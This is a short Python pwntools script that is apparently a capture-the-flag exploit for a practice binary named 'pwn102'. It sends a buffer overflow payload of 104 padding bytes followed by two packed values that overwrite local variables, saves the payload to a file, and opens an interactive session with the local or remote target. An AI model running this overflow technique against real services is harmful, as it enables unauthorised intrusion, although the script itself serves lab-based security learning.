from pwn import *

DEBUG = 0
if DEBUG == 0:
    p = process("./pwn102")
else:
    p = remote("", 9002 )

p.recvline(b"Am I right?")
local_c =  0x00c0ff33000
local_10 = 0xc0d3

payload = b'A' * 104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)     
        
with open('payload', 'wb') as file:
    file.write(payload)
p.sendline(payload)

p.interactive()
       
